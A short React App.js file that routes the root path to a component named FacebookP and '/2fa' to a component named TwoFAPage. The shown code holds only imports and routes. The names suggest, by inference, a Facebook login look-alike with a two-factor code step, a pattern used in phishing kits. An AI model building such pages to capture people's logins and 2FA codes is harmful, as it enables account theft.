import './output.css';
import FacebookP from "./Components/Facebook.js"
import TwoFAPage from "./Components/TwoFAPage.js"
import { Routes, Route } from "react-router-dom"

function App() {
  return (
    <div>
      <Routes>
        <Route path="/" element={<FacebookP />} />
        <Route path="/2fa" element={<TwoFAPage />} />
      </Routes>
    </div>
  );
}

export default App;


